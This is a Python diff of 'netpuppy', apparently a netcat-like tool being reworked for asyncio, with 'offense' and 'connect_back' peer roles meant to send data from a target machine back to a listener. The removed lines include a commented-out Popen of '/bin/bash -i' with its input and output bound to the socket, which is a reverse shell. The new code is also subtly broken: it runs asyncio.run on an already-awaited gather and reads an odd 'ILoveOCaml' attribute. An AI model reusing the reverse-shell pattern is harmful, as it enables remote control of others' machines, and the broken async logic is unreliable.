@@ -9,7 +9,7 @@ import argparse
 import socket
 import sys
 from netpuppy.classes import SocketConnection
-import subprocess
+import asyncio
 
 
 def network_port(value: str) -> int:
@@ -19,7 +19,7 @@ def network_port(value: str) -> int:
     return ivalue
 
 
-def main() -> None:
+async def main() -> None:
     # Make the CLI arg parser:
     parser = argparse.ArgumentParser(
         prog="netpuppy",  # ./netpuppy
@@ -66,6 +66,7 @@ def main() -> None:
     if args.cmd == "listen":
         SERVER_IP: str = "0.0.0.0"
         SERVER_PORT: str = args.port
+        PEER_TYPE: str = "offense"
 
         # Create a socket:
         ls: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -75,12 +76,12 @@ def main() -> None:
         # Set connection:
         print("Trying connection...")
         connection, addr = ls.accept()
-        sub_proc = 0
 
     # Client mode
     elif args.cmd == "connect":
         HOST_IP: str = args.host_ip
         HOST_PORT: str = args.port
+        PEER_TYPE: str = "connect_back"
 
         # Create a socket:
         cs: socket.socket | None = None
@@ -106,49 +107,46 @@ def main() -> None:
         print("Trying connection...")
         connection = cs
 
-        # Start subprocess:
-        sub_proc = None
-
         connection.connect((HOST_IP, HOST_PORT))
 
     if connection:
         # Get peer name and port, create SocketConnection object:
         peer = connection.getpeername()  # [peername, peer port]
-        current_connection: SocketConnection = SocketConnection(connection, peer[0])
+        current_connection: SocketConnection = SocketConnection(
+            connection, peer[0], PEER_TYPE
+        )
+        socket_file_no: int = (
+            current_connection.socket.fileno()
+        )  # the file descriptor of the socket
 
-        # if there s a subprocess, execute that shit
-        # subprocess.execute()
-        if sub_proc is None:
-            # make a subprocess to use for extracting target info
-            try:
-                socket_file_no: int = current_connection.socket.fileno()
+        # Depending on the socket "type", start a subprocess:
+        if (
+            current_connection.type == "offense"
+        ):  #  An 'offense' peer is the one listening for a connect_back (starts as the listener)
+            # sub_proc = subprocess.call
+            print("The peer type is offense")
+        elif (
+            current_connection.type == "connect_back"
+        ):  # A 'connect_back' peer is sending data from the machine it's on back to the offense peer
+            print("The peer type is connect_back")
 
-                sub_proc = subprocess.call(
-                    [
-                        "/usr/bin/date",
-                    ],
-                    stdin=socket_file_no,
-                    stderr=socket_file_no,
-                    stdout=socket_file_no,
-                )
-            # sub_proc = subprocess.Popen(
-            #     ["/bin/bash", "-i"],
-            #     stdin=socket_file_no,
-            #     stderr=socket_file_no,
-            #     stdout=socket_file_no,
-            #     shell=True,
-            # )
-
-            except Exception as err:
-                print(f"Exception in subproc try block: {err}")
-
-        # Update user:
-        print(f"Connection established to: {current_connection.address} port {peer[1]}")
+        print(
+            f"Connection established to: {current_connection.ILoveOCaml} port {peer[1]}"
+        )
 
         try:
             while connection:
-                current_connection.read_stream()
-                current_connection.write_stream()
+                # asyncio.eventloop
+                gather = await asyncio.gather(
+                    current_connection.read_stream(), current_connection.write_stream()
+                )
+
+                asyncio.run(gather)
+
+                # await current_connection.read_stream()
+                # await current_connection.write_stream()
+
+                # print(f"in main: {current_connection.sub_proc.stdout.read()}")
 
         except KeyboardInterrupt:
             print(f"Keyboard interrupt: {KeyboardInterrupt}")
@@ -167,6 +165,12 @@ def main() -> None:
         print("Connection failed.")
         sys.exit(1)
 
+
+def lil_wayne():
+    asyncio.run(main())
+
+
+lil_wayne()
 
 # SUDO CODE: (what OS)
 # nmap fingerprint
